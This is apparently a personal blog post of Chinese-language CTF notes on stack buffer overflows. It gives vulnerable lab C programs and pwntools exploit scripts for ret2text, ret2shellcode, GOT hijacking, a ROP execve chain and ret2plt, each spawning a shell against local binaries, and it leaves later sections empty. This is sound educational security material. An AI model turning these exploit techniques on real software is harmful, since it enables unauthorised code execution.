---
title: Pwn入门(2):Stack Overflow实战小结
date: 2021-12-26 14:09:00 +0800
author: sirius
categories: [CTF]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---

接着上一篇Pwn基础知识，这篇写一下栈溢出的实验小结，分成两个大部分：

- NTUSTISC视频中留的练习题
- CTF WIKI上的stack overflow部分题目



## NTUSTISC Lab

Lab0 的 pwntools上手题

![image-20211227225123600](/assets/img/2022/image-20211227225123600.png)

## Return to Text 

### # Lab1

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void y0u_c4n7_533_m3()
{
  execve("/bin/sh", (char *[]){0}, (char *[]){0});
}

int main()
{
  char buf[16];
  puts("This is your first bof challenge ;)");
  fflush(stdout);
  read(0, buf, 0x30);
  return 0;
}
```



![image-20211227225905877](/assets/img/2022/image-20211227225905877.png)

> 没有栈保护，代码15行读取0x30字节，buffer overflow，覆盖返回地址为y0u_c4n7_533_m3()函数地址即可。
>
> `objdump -d bof`:
>
> ![image-20211227232815402](/assets/img/2022/image-20211227232815402.png)



![image-20211227230813864](/assets/img/2022/image-20211227230813864.png)



### # Lab2

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void y0u_c4n7_533_m3()
{
  int allow = 0;
  if (allow) {
    execve("/bin/sh", 0, 0);
  }
  else {
    puts("Oh no~~~!");
    exit(0);
  }
}

int main()
{
  char buf[16];
  puts("This is your second bof challenge ;)");
  fflush(stdout);
  read(0, buf, 0x30);
  if (strlen(buf) >= 16) {
    puts("Bye bye~~");
    exit(0);
  }
  return 0;
}
```


![image-20211227233212607](/assets/img/2022/image-20211227233212607.png)

> 和第一个基本一样，控制程序执行流return到`execve("/bin/sh", 0, 0);`这一行即可。
>
> 第24行的bypass：strlen判断结束为接收到'\0'位置，所以直接传`\x00`就可以bypass

![image-20211227235502065](/assets/img/2022/image-20211227235502065.png)

![image-20211228000202164](/assets/img/2022/image-20211228000202164.png){: .normal}

strlen 精准bypass，但是没必要。直接全传`\x00`不香🐴  ，都不用算长度


## Return to Shellcode

### # Lab3

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char message[48];

int main()
{
  char name[16];
  printf("Give me your message: ");
  fflush(stdout);
  read(0, message, 0x30);
  printf("Give me your name: ");
  fflush(stdout);
  read(0, name, 0x30);
  return 0;
}
```

![image-20211228211845743](/assets/img/2022/image-20211228211845743.png)

> 知识点导航：https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#return-to-shellcode
>
> 没有开NX，所以可以向message中写入shellcode，并且在第15行控制程序执行流跳转到message处，执行shellcode

由于没有开PIE，所以程序运行时message所在的地址是不变的，可以通过如下图方式查看验证一波：

![image-20211228214000710](/assets/img/2022/image-20211228214000710.png)

简单的利用，shellcode就如下图所示，只要把rdi, rsi, rdx设置好，rax设为0x3b，最后调用syscall

https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md ,这个网站可以查syscall table

![image-20211228221733106](/assets/img/2022/image-20211228221733106.png)

![image-20211228221721048](/assets/img/2022/image-20211228221721048.png)

![image-20211228221554081](/assets/img/2022/image-20211228221554081.png)

> ![image-20211228223709889](/assets/img/2022/image-20211228223709889.png){: .normal}
>
> 0x68732f6e69622f这个数字就是"/bin/sh"的小端序表示，放进内存后计算机读取时就是/bin/sh，这个数字可以这么获得：
>
> ![image-20211228223842892](/assets/img/2022/image-20211228223842892.png){: .normal}
>
> 小端序就是 数据的低位存储在内存的低位
>
> ![image-20220101223657197](/assets/img/2022/image-20220101223657197.png){: .normal}
>
> 

![image-20211228221521394](/assets/img/2022/image-20211228221521394.png)

或者直接调用pwntools的shellcraft模块

![image-20211228222835433](/assets/img/2022/image-20211228222835433.png)

exp:

```python
from pwn import *


r = process("./ret2sc")
context(arch='amd64', os='linux')

r.recvuntil("message:")

# sc = """
# mov rbx, 0x68732f6e69622f
# push rbx
# mov rdi, rsp
# xor rsi, rsi
# xor rdx, rdx
# mov rax, 0x3b
# syscall
# """
# sc = asm(sc, arch="amd64")
r.send(asm(shellcraft.sh()))

r.recvuntil("name:")
p = "a"*0x18 + p64(0x601060)
r.send(p)

r.interactive()
```



在做题时想到的一个问题，为什么不能直接用`mov rdi,0x68732f6e69622f ` ，给rdi直接赋值呢，下面这段shellcode实际并不会拿到shell。

![image-20211229203010746](/assets/img/2022/image-20211229203010746.png)

原因其实也很简单，因为原先rdi等于0，给他附上0x68732f6e69622f后，实际这个是地址的值

![image-20220101221503781](/assets/img/2022/image-20220101221503781.png)

再对比下正确的方式，注意看`x/gx $rdi 和 x/s $rdi`, 通过取$rdi地址上存储的数据，得到`/bin/sh`

![image-20220101223133449](/assets/img/2022/image-20220101223133449.png){: .normal}

## GOT Hijacking

### # Lab4

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char name[64];

int main()
{
  int unsigned long long addr;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  printf("What's you name?\n");
  read(0, name, 0x40);
  printf("Where do you want to write?\n");
  scanf("%llu", &addr);
  printf("Data: ");
  read(0, (char *)addr, 8);
  puts("Done!");
  printf("Thank you %s!\n", name);
  return 0;
}
```

![image-20220103212102156](/assets/img/2022/image-20220103212102156.png)

> 知识点：https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#got-hijacking
>
> 思路：开了栈保护，没法直接覆盖main的返回地址。可以通过line13 首先向name中写入shellcode（因为没有开NX），然后14行至17行，获取puts的GOT表地址，并且改写puts@got的地址为name的地址。
>
> 在第18行，`puts("Done!");`，会去puts@got取地址并执行。(第12行 实际是puts，所以由于lazy binding的关系，puts@got表中已经放入了puts的实际地址，当然后来被我们改写掉了）。

![image-20220103214630206](/assets/img/2022/image-20220103214630206.png)

exp:

```python
from pwn import *


r = process('./gothijack')

context(arch='amd64', os='linux')

r.recvuntil('name?\n')
r.send(asm(shellcraft.sh()))

puts_got_addr = 0x601018
name_addr = 0x601080 #<name>

r.recvuntil('write?\n')
r.sendline(str(puts_got_addr))
r.recvuntil('Data: ')
r.send(p64(name_addr))

r.interactive()
```



## ROP base

### # Lab5

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
  char buf[16];
  puts("This is your first rop challenge ;)");
  fflush(stdout);
  read(0, buf, 0x90);
  return 0;
}
```

![image-20220103220219559](/assets/img/2022/image-20220103220219559.png)

这里发现打开了栈保护，但是其实是因为静态链接的关系，把整个glic带进来了，glic里是有canary的。

而我们的main程序中是没有的：

![image-20220103220453043](/assets/img/2022/image-20220103220453043.png)

于是思路就是第10行栈溢出，构造ROP链，覆盖返回值。

>![image-20220103222106261](/assets/img/2022/image-20220103222106261.png)

使用到的工具 **ROPgadget**   ---- `ROPgadget --binary ./rop --only "pop|ret"`

![image-20220103221504517](/assets/img/2022/image-20220103221504517.png)

![image-20220103223533042](/assets/img/2022/image-20220103223533042.png)

其他的gadgets类似。

![image-20220103224728240](/assets/img/2022/image-20220103224728240.png)

Exp: 

```python
from pwn import *


r = process('./rop')

r.recvuntil('challenge ;)')

bss_addr = 0x6bb2e0
pop_rsi = 0x0000000000410093 # pop rsi ; ret
mov_rdi_rsi = 0x0000000000446c1b # mov qword ptr [rdi], rsi ; ret
pop_rdi = 0x0000000000400686 # pop rdi ; ret
pop_rdx = 0x00000000004494b5 # pop rdx ; ret
pop_rax = 0x0000000000415294 # pop rax ; ret
syscall = 0x00000000004011fc # syscall

p = 'a'*0x18
p += p64(pop_rdi)
p += p64(bss_addr)
p += p64(pop_rsi)
p += '/bin/sh\x00'
p += p64(mov_rdi_rsi)
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(pop_rax)
p += p64(0x3b)
p += p64(syscall)


r.send(p)
r.interactive()
```



## Return to PLT

### # Lab6

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char name[16];

int main()
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  char buf[16];
  system("echo What is your name?");
  read(0, name, 0x10);
  puts("Say something: ");
  read(0, buf, 0x40);
  return 0;
}
```

![image-20220104222611843](/assets/img/2022/image-20220104222611843.png)

> 思路：
>
> ![image-20220104222505460](/assets/img/2022/image-20220104222505460.png)
>
> 调用system前的ret是为了对齐字节，不加无法拿到shell
>
> XMM register 128bit，stack需要对齐0x10， stack是0x08 会crash。 return会对齐stack

![image-20220104224917123](/assets/img/2022/image-20220104224917123.png)

exp:

```python
from pwn import *


r = process('./ret2plt')
# context.log_level="debug"
raw_input(">>")

r.recvuntil('name?')
r.send('sh\x00')
r.recvuntil('something: ')

name_addr = 0x601070 # <name>
pop_rdi = 0x0000000000400733 # pop rdi ; ret
ret = 0x00000000004004fe # ret
system_plt = 0x0000000000400520  # <system@plt>

p = 'a'*0x18
p += p64(pop_rdi)
p += p64(name_addr)
p += p64(ret)
p += p64(system_plt)

r.send(p)

r.interactive()
```



## Return to libc

### # Lab7







##  CTF wiki

## 基本ROP

### # ret2text



### # ret2shellcode



## 中级ROP



## 高级ROP

